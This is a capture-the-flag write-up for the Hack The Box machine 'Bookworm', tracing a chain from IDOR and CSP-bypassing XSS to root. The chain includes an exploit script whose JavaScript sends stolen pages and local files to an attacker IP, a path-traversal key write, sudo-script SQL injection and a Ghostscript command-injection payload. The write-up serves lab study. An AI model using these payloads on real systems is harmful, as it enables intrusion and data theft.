# Bookworm

![Untitled](https://github.com/InfoSec-Crow/Writeups/blob/main/htb/machines/Bookworm/Bookworm.png)

## nmap
    
    ```
    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   3072 81:1d:22:35:dd:21:15:64:4a:1f:dc:5c:9c:66:e5:e2 (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJFj5rM4cLScsJ6ppJO9IxEYpw0bXXh9woF65DRqAjYu0/zJDURGEjP5B7YjB/J/HS4KsCtxSpvfLeO+PRNPlDkEkXyqNK2ZA8Vl+pHUyYFgYM/GYsIwFPg+Du2NU80GAg/qA+QMagKyhBDcUyhxWCFsb5n27xiGk+s8wQzJu82BBU2mRbN+fS9Z6Vu+ien9iAB7gwFlNC6vVGrl6AZbopuzDj2KD5TVB5qF9jG2kaKKftH7xZ2G/1Ql+VNQZ3XB/TJZS/wtUTgpsNNZfFGfAmzruSqmAhy6rmnl9qV6D/8JX+Fnie84iuURHT/uSHyQmEtjYeYxNhulaXs3iKm+A+E0RpbhQiuxEHmlAEmN78lGpNeDvaqWzM88G4bonMiAbJqHh3FX7E5wlsYE0G3qGV8Khk2jdMydLvqbJB2xMbYE1HE5tek/2g/OmUudWBWXWhk/uNMSRr3U8s/WEu0kGhbrFUkGbQHu4+Fui4Gm1TRwk2Mv+Jyi72pOHi2j43bHc=
    |   256 01:f9:0d:3c:22:1d:94:83:06:a4:96:7a:01:1c:9e:a1 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGgMJ/I1ptV34IVNgJcPqNq9N9IDAKSGVknIXSeLjxwtgbYXJCcPaxIaoKrUySxDakTdPX69Xm5cqzAe1tt/wLA=
    |   256 64:7d:17:17:91:79:f6:d7:c4:87:74:f8:a2:16:f7:cf (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKJXHOUfa1ZogImXoMvvAgO9Y9QN0st0mrynZutcKR+A
    80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Bookworm
    | http-methods:
    |_  Supported Methods: GET HEAD POST OPTIONS
    ```
    

### Wappalyzer

- Web framework: Express
- Programming languages: Node.js
- Web Servers: Ngnix 1.18.0

## Fuzzing

### Dirsearch

```
[21:36:15] 302 -   28B  - /download/history.csv  ->  /login
[21:36:15] 302 -   28B  - /download/users.csv  ->  /login
[21:36:28] 200 -    2KB - /login/
[21:36:28] 200 -    2KB - /login
[21:36:29] 302 -   23B  - /logout  ->  /
[21:36:29] 302 -   23B  - /logout/  ->  /
[21:36:39] 302 -   28B  - /profile  ->  /login
[21:36:41] 200 -    3KB - /register
[21:36:44] 200 -   11KB - /shop
[21:36:46] 301 -  179B  - /static  ->  /static/
```

### Order ID

- `wfuzz -w num.lst -u [http://bookworm.htb/order/FUZZ](http://bookworm.htb/order/FUZZ) -b 'session=eyJmbGFzaE1lc3NhZ2UiOnt9LCJ1c2VyIjp7ImlkIjoxNCwibmFtZSI6InRlc3QiLCJhdmF0YXIiOiIvc3RhdGljL2ltZy91c2VyLnBuZyJ9fQ==; session.sig=tLkyWFPMf7F6gRSqT3TYpWYSCl0' --hc 302`

Only found my order ID

## Seasion Cookie

```json
{"flashMessage":{},"user":{"id":14,"name":"test","avatar":"/static/img/uploads/14"}}
```

We cant change values.

# Functions

## File Upload

When we upload a image or any file (no type or name check) it goes to `/static/img/uploads/<user id>` the file names is the userid → 14

# IDOR

We can change book notes in the basket from other users. 

- /basket/443/edit

The nummber stands for an book in the basket. We can fuzz this and send any post request with content, to change the notes. 

We can find this nummber, in the /shop side, it tracks the users activity and log the nummber as comment.  `<!-- 1439 -->`

```html
<div class="row mb-2">
            <!-- 1439 -->
            <div class="col-3"><img class="img-fluid" src="/static/img/uploads/6"/></div>
            <div class="col-9"><strong>Sally Smith</strong> just added <a href="/shop/10">$1,000 a Plate</a> to their basket!<p class="mb-0 text-muted">just now</p></div>
            
        </div>
```

# XSS

We can inject a `<script>alert(1)<script>` in the book notes from the basket.

After viewing Order, we get a error from the CSP

### CSP - Bypass

```
Content-Security-Policy: script-src 'self'
```

```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution.
```

We can bypass the CSP with the Avater file upload. 

Upload a file test.png with this contnet. 

```
var http=new XMLHttpRequest(); 
http.open('GET', 'http://10.10.14.20/?xss=' + btoa(document.body.innerHTML), true);
http.send();
```

We can find the file at `http://bookworm.htb/static/img/uploads/14`

Now we can add the url to the xss payload to execute the code in the file. 

```
<script src="http://bookworm.htb/static/img/uploads/14"></script>
```

because the url comes form the host (self) the CSP dont trigger. 

# XSS to CSRF

## Download

Find on the /oder/16 from other users. 

[http://bookworm.htb/download/16?bookIds=21](http://bookworm.htb/download/16?bookIds=21)

There are some users that trigger the payload, when buying a book. 

1. Read the /profile page from the users to get the `orderId`
2. read the /order/<`oderId`> page to see the /download function

## LFI via secound URL-Parameter

When we send a request to 

- http://bookworm.htb/download/16?bookIds=21

fom a user via the XSS

```html
Error
Not Found
```

When we try to read files 

- http://bookworm.htb/download/16?bookIds=../../../../../../../etc/passwd

```html
Error
Forbidden
```

So we cant simply inject in the bookIds URL-Paramter. 

In one of the order pages like `/order/2` we can find a download path with two bookIds, because the users can download all books at the sime time. 

When we send the payload and get the content from this get requst

- http://bookworm.htb/download/<oderId from the user>?bookIds=.&bookIds=../../../../../../../etc/passwd

we get nothing back or a normal /profile page…

## Final Scripts for JavaScript Payload and Attack-Server

First we need a JavaScript code, that get the orderId from the target user that trigger the xss. Secound we send a requst to the /download with the LFI.

The Attack-Sever get the response back. Because of the download function, we get a file back (ZIP-File) so the server needs to safe the data in a temp file. 

### Server.py

```python
#!/usr/bin/python3
from http.server import SimpleHTTPRequestHandler, HTTPServer
import random
from urllib.parse import urlparse, parse_qs

port = 8099

class RequestHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        # print(self.headers)
        parsed_url = urlparse(self.path)
        query_params = parse_qs(parsed_url.query)
        if 'url' in query_params:
            print(query_params['url'][0])
        # Handle POST request here
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        # if post_data.decode().isprintable():
        # print(f'POST data: {post_data.decode()}')
        # else:
        filename = 'temp' + str(random.randint(0, 9999))
        with open(filename,'wb') as f:
            f.write(post_data)
        print("Non ascii characters detected!! Content written to ./{} file instead.".format(filename))
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'POST request received')

def do_GET(self):
    # print(self.headers)
    parsed_url = urlparse(self.path)
    query_params = parse_qs(parsed_url.query)
    if 'url' in query_params:
        print(query_params['url'][0])
    SimpleHTTPRequestHandler.do_GET(self)

def run_server():
    server_address = ('', port)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f'Server running on http://localhost:{port}')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print('Server stopped')
    
if __name__ == '__main__':
    run_server()
```

### Payload.js

(only the javascript code, this is a string in the [exploit.py](http://exploit.py))

```jsx
function get_orders(html_page){
    // Create a new DOMParser instance
    const parser = new DOMParser();
    // HTML string to be parsed
    const htmlString = html_page;
    // Parse the HTML string
    const doc = parser.parseFromString(htmlString, 'text/html');
    // Find all the anchor tags within the table body
    const orderLinks = doc.querySelectorAll('tbody a');
    // Extract the URLs and store them in an array
    const orderUrls = Array.from(orderLinks).map((link) =>
    link.getAttribute('href'));
    // Returns an array of paths to orders
    return orderUrls;
}    

function getDownloadURL(html) {
    // Create a temporary container element to parse the HTML
    const container = document.createElement('div');
    container.innerHTML = html;
    // Use querySelector to select the download link element
    const downloadLink = container.querySelector('a[href^="/download"]');
    // Extract the download URL
    // const downloadURL = downloadLink ? downloadLink.href : null;
    const downloadURL = downloadLink ? downloadLink.href.substring(0,
    downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../../etc/passwd" : null;
    // Return a complete url to fetch the download item
    return downloadURL;
}

function fetch_url_to_attacker(url){
    var attacker = "http://10.10.14.47:8099/?url=" + encodeURIComponent(url);
    fetch(url).then(
        async response=>{
            fetch(attacker, {method:'POST', body: await response.arrayBuffer()})
            }
        );
}

function get_pdf(url){
    // will fetch the PDF (takes the downloadURL as argument) and send its content to my server
    fetch(url).then(
        async response=>{
        fetch_url_to_attacker(getDownloadURL(await response.text()));
    })
}
fetch("http://10.10.14.47:8099/?trying")
fetch("http://bookworm.htb/profile").then(
    async response=>{
        for (const path of get_orders(await response.text())){
            //fetch_url_to_attacker("http://bookworm.htb" + path);
            get_pdf("http://bookworm.htb" + path);
        }
    }
)
```

### Exploit.py

the script can read the /profile page to run `./exploit.py profile`

Read files run `./exploit.py /etc/passwd`

```python
#!/usr/bin/python3
import requests, sys, time
from bs4 import BeautifulSoup as BS
from bs4 import Comment
import time

user_id = "14"
cookie = "eyJmbGFzaE1lc3NhZ2UiOnt9LCJ1c2VyIjp7ImlkIjoxNCwibmFtZSI6InRlc3QiLCJhdmF0YXIiOiIvc3RhdGljL2ltZy91c2VyLnBuZyJ9fQ==;xFXaoDiEji4nxaMms04qcaK-KQo"
c = cookie.split(";")
cookies = {
    'session': c[0],
    'session.sig': c[1]
}
proxies = {}
try:
    if sys.argv[2] == "proxy":
        proxies = {'http': 'http://127.0.0.1:8080'}
except: 
    pass
try:
   SIDE = sys.argv[1]
   file = sys.argv[1]
except:
    SIDE = ""

def read_profile_payload():
    payload = '''
    var url = "http://bookworm.htb/profile";
    var attacker = "http://10.10.14.47/exfil";
    var xhr  = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
        }
    }
    xhr.open('GET', url, true);
    xhr.send(null);
    '''
    return payload

def get_download_content():
    payload = """
function get_orders(html_page){
    // Create a new DOMParser instance
    const parser = new DOMParser();
    // HTML string to be parsed
    const htmlString = html_page;
    // Parse the HTML string
    const doc = parser.parseFromString(htmlString, 'text/html');
    // Find all the anchor tags within the table body
    const orderLinks = doc.querySelectorAll('tbody a');
    // Extract the URLs and store them in an array
    const orderUrls = Array.from(orderLinks).map((link) =>
    link.getAttribute('href'));
    // Returns an array of paths to orders
    return orderUrls;
}    

function getDownloadURL(html) {
    // Create a temporary container element to parse the HTML
    const container = document.createElement('div');
    container.innerHTML = html;
    // Use querySelector to select the download link element
    const downloadLink = container.querySelector('a[href^="/download"]');
    // Extract the download URL
    // const downloadURL = downloadLink ? downloadLink.href : null;
    const downloadURL = downloadLink ? downloadLink.href.substring(0,
    downloadLink.href.lastIndexOf("=") + 1) + ".&bookIds=../../../../../../.."""+file+"""" : null;
    // Return a complete url to fetch the download item
    return downloadURL;
}

function fetch_url_to_attacker(url){
    var attacker = "http://10.10.14.47:8099/?url=" + encodeURIComponent(url);
    fetch(url).then(
        async response=>{
            fetch(attacker, {method:'POST', body: await response.arrayBuffer()})
            }
        );
}

function get_pdf(url){
    // will fetch the PDF (takes the downloadURL as argument) and send its content to my server
    fetch(url).then(
        async response=>{
        fetch_url_to_attacker(getDownloadURL(await response.text()));
    })
}
fetch("http://10.10.14.47:8099/?trying")
fetch("http://bookworm.htb/profile").then(
    async response=>{
        for (const path of get_orders(await response.text())){
            //fetch_url_to_attacker("http://bookworm.htb" + path);
            get_pdf("http://bookworm.htb" + path);
        }
    }
)
"""
    return payload

def craft_payload():
    if SIDE == "profile":
        return read_profile_payload()
    else:
        return get_download_content()

def upload_payload(user_id, payload, cookies):
    headers = {
        'Host': 'bookworm.htb',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarygDOQYUG9r4vVpe0O',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://bookworm.htb',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer': 'http://bookworm.htb/profile',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }
    data = f'------WebKitFormBoundarygDOQYUG9r4vVpe0O\r\nContent-Disposition: form-data; name="avatar"; filename="test.png"\r\nContent-Type: image/png\r\n\r\n{payload}\n\r\n------WebKitFormBoundarygDOQYUG9r4vVpe0O--\r\n'

    r = requests.post('http://bookworm.htb/profile/avatar', cookies=cookies, proxies=proxies, headers=headers, data=data, verify=False)
    print("-------------------------")
    r = requests.get(f'http://bookworm.htb/static/img/uploads/{user_id}', cookies=cookies, proxies=proxies)
    print(r.text.strip())
    print("-------------------------")

def get_shop(cookies):
    r = requests.get(f'http://bookworm.htb/shop',proxies=proxies, cookies=cookies)
    soup = BS(r.text, 'html.parser')
    comments = soup.find_all(string=lambda text: isinstance(text, Comment))
    item = soup.find_all(lambda tag: tag.name == 'div' and tag.get('class') == ['col-9'])
    return comments, item

def get_timestemp():
    current_time = time.localtime()
    timestemp = time.strftime("%I:%m:%S", current_time)
    return timestemp

def get_infos(cookies):
    note_ids = []
    target = ""
    comments = []
    item = []
    start = get_timestemp()
    while not len(comments) >= 3:
        comments, item = get_shop(cookies)
        timestamp = get_timestemp()
        time.sleep(1)
        print(f"\r {start} --Wait for Target-- {timestamp}", end="\r")
    print("")
    target = item[1].find("strong").text
    for c in comments:
        c = c.strip()
        if c.isdigit():
            note_ids.append(c)
    print(f"[>] {target} = {note_ids}")
    return target.strip(), note_ids

def place_payload(user_id, note_id, cookies):
    headers = {
        'Host': 'bookworm.htb',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'http://bookworm.htb',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': 'http://bookworm.htb/basket',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'close',
    }
    for note_id in note_ids:
        data = {
            'quantity': '1',
            'note': f'<script src="http://bookworm.htb/static/img/uploads/{user_id}"></script>',
        }
        r = requests.post(f'http://bookworm.htb/basket/{note_id}/edit',proxies=proxies, cookies=cookies, headers=headers, data=data, verify=False)
        print(f"[>>] Write: {note_id} - ({r.status_code})")

def check_trigger(cookies):
    comments = [0,0,0]
    start = get_timestemp()
    while not len(comments) <= 1:
        comments, item = get_shop(cookies)
        timestamp = get_timestemp()
        time.sleep(1)
        print(f"\r {start} --Wait for Trigger-- {timestamp}", end="\r")
    print("")
    print("-> XSS Triggerd")

target, note_ids = get_infos(cookies)
list_payload = craft_payload() 
upload_payload(user_id, list_payload, cookies)
place_payload(user_id, note_ids, cookies)

check_trigger(cookies)
```

After running the [server.py](http://server.py) and the exploit.py, we get some tempXXX files back.

Every user have 3 vaild orderIds that can be used for the /download function and LFI. So the content of the LFI file is in three of the tempXXX files. 

## Read imporant local files

Now, if we read /proc/self/cmdline we can see that it is running /usr/bin/node index.js , so

we know that the application source code is inside index.js file.

- `unzip -l temp4970`

```
Archive:  temp4970
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2023-05-03 15:34   Unknown.pdf/
       23  2023-05-28 17:33   Unknown.pdf
---------                     -------
       23                     2 files
```

- `unzip -p temp4970 Unknown.pdf`

```
/usr/bin/nodeindex.js
```

Using /proc/self/cwd/index.js we can get the source code

```jsx
#SNIP#
const { flash } = require("express-flash-message");
const { sequelize, User, Book, BasketEntry, Order, OrderLine } = require("./database");
const { hashPassword, verifyPassword } = require("./utils");
#SNIP#
```

After inspecting it, we see that there is a require("./database") at the top, so we inspect the

file called database.js ( /proc/self/cwd/database.js ) and we see the password for user frank.

```jsx
#SNIP# 
const sequelize = new Sequelize(
  process.env.NODE_ENV === "production"
    ? {
        dialect: "mariadb",
        dialectOptions: {
          host: "127.0.0.1",
          user: "bookworm",
          database: "bookworm",
          password: "FrankTh3JobGiver",
        },
	  logging: false,
      }
    : "sqlite::memory::"
);
#SNIP#
```

SSH login

- `sshpass -p FrankTh3JobGiver ssh frank@bookworm.htb`

frank : FrankTh3JobGiver

uid=1001(frank) gid=1001(frank) groups=1001(frank)

→ user.txt

# Lateral Movement

We in the home folder from neil, we have the folder `converter` . This is the express web app that runs on local port 3001. 

Download the `/home/neil/converter/index.js`

### Port forward

Kali: `sudo ./chisel server --reverse --port 5000`

Box: `./chisel client 10.10.14.24:5000 R:3001:127.0.0.1:3001`

```jsx
const express = require("express");
const nunjucks = require("nunjucks");
const fileUpload = require("express-fileupload");
const path = require("path");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const child = require("child_process");

const app = express();
const port = 3001;

nunjucks.configure("templates", {
  autoescape: true,
  express: app,
});

app.use(express.urlencoded({ extended: false }));
app.use(
  fileUpload({
    limits: { fileSize: 2 * 1024 * 1024 },
  })
);

const convertEbook = path.join(__dirname, "calibre", "ebook-convert");

app.get("/", (req, res) => {
  const { error } = req.query;

  res.render("index.njk", { error: error === "no-file" ? "Please specify a file to convert." : "" });
});

app.post("/convert", async (req, res) => {
  const { outputType } = req.body;

  if (!req.files || !req.files.convertFile) {
    return res.redirect("/?error=no-file");
  }

  const { convertFile } = req.files;

  const fileId = uuidv4();
  const fileName = `${fileId}${path.extname(convertFile.name)}`;
  const filePath = path.resolve(path.join(__dirname, "processing", fileName));
  await convertFile.mv(filePath);

  const destinationName = `${fileId}.${outputType}`;
  const destinationPath = path.resolve(path.join(__dirname, "output", destinationName));

  console.log(filePath, destinationPath);

  const converter = child.spawn(convertEbook, [filePath, destinationPath], {
    timeout: 10_000,
  });

  converter.on("close", (code) => {
    res.sendFile(path.resolve(destinationPath));
  });
});

app.listen(port, "127.0.0.1", () => {
  console.log(`Development converter listening on port ${port}`);
});
```

We can upload a file and get a new file for the download. We can convert pdf to epub for example.

We see the POST parameter outputType is not validated, so we can inject some path traversal.

## Path Traversal - File write via Symlink

We can read and write other files like 

- `/../../../../../../tmp/test.txt`

But the function crate a folder when the file have now extension! 

So this crate the folder `authorized_keys` but not the file !!!

- `/../../../../../../home/neil/.ssh/authorized_keys`

To create a authorized_keys as a file, we can place a symlink file with frank that write to the `authorized_keys` .

1. make a folder like `/dev/shm/test` and run `chmod 777 authorized_keys`
2. place the symlink file `ln -s /home/neil/.ssh/authorized_keys /dev/shm/test/ssh.txt`
3. write the public ssh key to the symlik file via download.
    - `/../../../../../../dev/shm/test/ssh.txt`
    - POST request
        
        ```
        POST /convert HTTP/1.1
        Accept-Language: en-US,en;q=0.9
        Connection: close
        ------WebKitFormBoundaryNAAjYWUAsRMZAAB7
        Content-Disposition: form-data; name="convertFile"; filename="test.txt"
        Content-Type: text/plain
        
        ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCiGr6HorAOg7nBCwrzj3A9AIKvprS5LtXMtaex0avsiBlB3AidTTMqAjY9TLC/QXEwYGHB3VZZwIshTlcIT2XlBJbBPSujc5x4QA3klHUVhFZVEAFdFusTbf1ZHV5Sxxz+P9CzdYBYNZV9gdMPoxbYypMmioLpSAN5dJ5kpSgiI3qGgKZFNZndYvyEoVNwLZSI6iHoCZd2N6xViLkqsVZcnxo1iSrIIXmK1Dh0l206ilkMye3UT7ONO7Unc2ZEQQVBqMDT5EWJ0F/n+rmXSwmX4EIkLOTYiuVh2igp/Q6jGufK0W2SQYUypAbY+6UB2La5y5roM7u52HixEYPQGPQLyTIWH80yOU/OrTAh8eALvYV4KW3PDOPw5rLFff0vYoszHTZzeWMB5jsbKN+0nsHV/5zqQo37sKXrq+1PukG3CIJduLg1oOrtDNBbX0EAF6DTFGH2uCEHKrgqAnxka33wYQDHRh6kq7+HcXIo+xik8mAoFd7/uL4yPsX0Eysgh6M= kali@kali
        
        ------WebKitFormBoundaryNAAjYWUAsRMZAAB7
        Content-Disposition: form-data; name="outputType"
        
        /../../../../../../dev/shm/test/ssh.txt
        
        ------WebKitFormBoundaryNAAjYWUAsRMZAAB7--
        ```
        

After we get a 200. we can login via ssh

- `ssh neil@bookworm.htb -i /home/kali/.ssh/id_rsa`

uid=1002(neil) gid=1002(neil) groups=1002(neil)

# Priv Esc

- `sudo -l`

```
User neil may run the following commands on bookworm:
    (ALL) NOPASSWD: /usr/local/bin/genlabel
```

```python
#!/usr/bin/env python3
import mysql.connector
import sys
import tempfile
import os
import subprocess
with open("/usr/local/labelgeneration/dbcreds.txt", "r") as cred_file:
    db_password = cred_file.read().strip()
cnx = mysql.connector.connect(user='bookworm', password=db_password,
                              host='127.0.0.1',
                              database='bookworm')
if len(sys.argv) != 2:
    print("Usage: genlabel [orderId]")
    exit()
try:
    cursor = cnx.cursor()
    query = "SELECT name, addressLine1, addressLine2, town, postcode, Orders.id as orderId, Users.id as userId FROM Orders LEFT JOIN Users On Orders.userId = Users.id WHERE Orders.id = 1%s" % sys.argv[1]
    cursor.execute(query)
    temp_dir = tempfile.mkdtemp("printgen")
    postscript_output = os.path.join(temp_dir, "output.ps")
    # Temporary until our virtual printer gets fixed
    pdf_output = os.path.join(temp_dir, "output.pdf")
    with open("/usr/local/labelgeneration/template.ps", "r") as postscript_file:
        file_content = postscript_file.read()
    generated_ps = ""
    print("Fetching order...")
    for (name, address_line_1, address_line_2, town, postcode, order_id, user_id) in cursor:
        file_content = file_content.replace("NAME", name) \
                        .replace("ADDRESSLINE1", address_line_1) \
                        .replace("ADDRESSLINE2", address_line_2) \
                        .replace("TOWN", town) \
                        .replace("POSTCODE", postcode) \
                        .replace("ORDER_ID", str(order_id)) \
                        .replace("USER_ID", str(user_id))
    print("Generating PostScript file...")
    with open(postscript_output, "w") as postscript_file:
        postscript_file.write(file_content)
    print("Generating PDF (until the printer gets fixed...)")
    output = subprocess.check_output(["ps2pdf", "-dNOSAFER", "-sPAPERSIZE=a4", postscript_output, pdf_output])
    if output != b"":
        print("Failed to convert to PDF")
        print(output.decode())
    print("Documents available in", temp_dir)
    os.chmod(postscript_output, 0o644)
    os.chmod(pdf_output, 0o644)
    os.chmod(temp_dir, 0o755)
    # Currently waiting for third party to enable HTTP requests for our on-prem printer
    # response = requests.post("http://printer.bookworm-internal.htb", files={"file": open(postscript_output)})
except Exception as e:
    print("Something went wrong!")
    print(e)
cnx.close()
```

We can inject into the sqlstatement !

## SQLi Error Based and Union Select

Union select:

- `sudo /usr/local/bin/genlabel "0 union select version(),2,3,4,5,6,7"`

The output is in the `/tmp/tmp4pi89brfprintgen/output.ps`

Error Based:

- `sudo /usr/local/bin/genlabel "(SELECT*FROM(SELECT(name_const(version(),1)),name_const(version(),1))a)"`

```
(42S21): Duplicate column name '10.3.38-MariaDB-0ubuntu0.20.04.1'
```

### Dump wit sqlmap - `optional`

- `sqlmap -u '[http://127.0.0.1:1337/sqli?payload=1](http://127.0.0.1:1337/sqli?payload=1)' --prefix '0' --batch --flush-session --union-cols 7-7 --technique=EU --dbms=MariaDB --threads=10`

```python
from flask import Flask, request
import os

app = Flask(__name__)

@app.route('/sqli')
def sqli():
    ssh = 'sshpass ssh neil@bookworm.htb -i /home/kali/.ssh/id_rsa'
    cmd_out = os.popen(f"{ssh} -C \"sudo /usr/local/bin/genlabel '{request.args['payload']}'\"").read()
    if '/tmp/' in cmd_out:
        return os.popen(f"{ssh} -C \"cat '{cmd_out[-25:].strip()}/output.ps'\"").read()
    else:
        return cmd_out

if __name__ == '__main__':
    app.run(debug=True, port=1337)
```

```
---
Parameter: payload (GET)
    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: payload=10 AND EXTRACTVALUE(6115,CONCAT(0x5c,0x716a707171,(SELECT (ELT(6115=6115,1))),0x716a7a7871))

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns (custom)
    Payload: payload=-58350 UNION ALL SELECT 65,65,65,65,65,CONCAT(0x716a707171,0x666e56547a72594a6b704d684c7379566a744c496a58636f6964515874416664646f6f7177476572,0x716a7a7871),65-- -
---
```

```
sqlmap -u 'http://127.0.0.1:1337/?payload=1' --technique=E --batch -D bookworm --tables

+---------------+
| BasketEntries |
| Books         |
| OrderLines    |
| Orders        |
| Users         |
+---------------+

sqlmap -u 'http://127.0.0.1:1337/?payload=1' --technique=E --batch -D bookworm -T Users -C username,password --dump

+--------------+----------------------------------+
| username     | password                         |
+--------------+----------------------------------+
| jakub1993    | 1fd17f5623370abe7ba9929f7b2b7982 |
| bubbler1984  | 23d8ad788147bab0b3e50c58d0d0ca7f |
| sallysmithy  | 254aa41454d9626e7716ea48e9169dbf |
| angussy      | 4f6b9a1f7a17192ea81489dbf920c1c2 |
| totalsnack   | cb9774805ece216aebe01e90f5379995 |
| awawawawawaw | f7d840d46c7511b491d84e523260456d |
+--------------+----------------------------------+

sqlmap -u 'http://127.0.0.1:1337/?payload=1' --technique=E --batch --sql-query="user()"
```

## **Ghostscript** ps2pdf RCE — `C**VE-2023-36664**`

[CVE-2023-36664: Command injection with Ghostscript PoC + exploit - vsociety](https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript-poc-exploit)

We can inject data into the .ps file that gets executed from the ps2pdf 

```python
output = subprocess.check_output(["ps2pdf", "-dNOSAFER", "-sPAPERSIZE=a4", postscript_output, pdf_output])
```

We can the input id 0, that give no values from the variables back, so we can overwrite them with union select.

- `sudo /usr/local/bin/genlabel "0 union select ')\n(%pipe%id > /dev/shm/root) (w) file /DCTDecode filter\n(foobar' as name, 'foobar' as addressLine1, 'foobar' as addressLine2, 'foobar' as town, 'foobar' as postcode, 0 as orderId, 1 as userId;"`

We see the root file!

→ root.txt

Also we can write files like the `authorized_keys` for root.

- `sudo /usr/local/bin/genlabel "0 union select') show\n/root/.ssh (w) file /root/.ssh/authroized_keys exch def\n/root/.ssh/authroized_keys (<ssh-rsa ...>) writestring\n/root/.ssh/authroized_keys closefile\n(foobar' as name, 'foobar' as addressLine1, 'foobar' as addressLine2, 'foobar' as town, 'foobar' as postcode, 0 as orderId, 1 as userId;"`

And login via ssh

---

## Chrom Remote Debugging Port - File Read — `unintended way`

[Chrome Debugger Arbitrary File Read](https://blog.pentesteracademy.com/chrome-debugger-arbitrary-file-read-1ff2c41320d1)

After logging in, we can see, using ps aux , root running chrome with remote debugging port set to 0. A value of 0 for the --remote-debugging-port flag indicates that Chrome should choose a random available port for remote debugging each time it starts. This allows multiple instances of Chrome to run simultaneously without conflicts.

- ps -aux | grep chrom

```
root       13462  0.7  3.3 1185800160 135384 ?   Sl   15:26   0:00 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=13428 --no-sandbox --disable-dev-shm-usage --disable-background-timer-throttling --disable-breakpad --enable-automation --force-color-profile=srgb --remote-debugging-port=0 --allow-pre-commit-input --ozone-platform=headless --disable-databases --disable-gpu-compositing --enable-blink-features=IdleDetection --lang=en-US --num-raster-threads=1 --renderer-client-id=4 --time-ticks-at-unix-epoch=-1685356838683380 --launch-time-ticks=17125352034 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,5919309595080643966,4438090446638180176,262144 --enable-features=Network
```

We can use netstat to get the open port, and we can easly identify the one we're looking for since it will be a high random number. Then we port forward the port using SSH to our local machine.

- `netstat -tulp`

```
tcp        0      0 localhost:34999         0.0.0.0:*               LISTEN      -
```

Info: The port change after the ssh logout and login. 

Open a new ssh connection with port tunnel

- `sshpass -p "FrankTh3JobGiver" ssh frank@bookworm.htb -L 34999:127.0.0.1:34999`

### MSF

- `use gather/chrome_debugger`
    - `set rhosts 127.0.0.1`
    - `set lport 34999`
    - `set filepath /root/root.txt`
- `run`

```
[*] Running module against 127.0.0.1
[*] Attempting Connection to ws://127.0.0.1:38373/devtools/page/E6093851EB436C85EBCA52032F508614
[*] Opened connection
[*] Attempting to load url file:///root/root.txt
[*] Received Data
[*] Sending request for data
[*] Received Data
[+] Stored file:///root/root.txt at /root/.msf4/loot/20230529172447_default_127.0.0.1_chrome.debugger._986465.txt
[*] Auxiliary module execution completed
```

We can find the content of the flag in 

- `/root/root.txt at /root/.msf4/loot/20230529172447_default_127.0.0.1_chrome.debugger._986465.txt`

→ root.txt
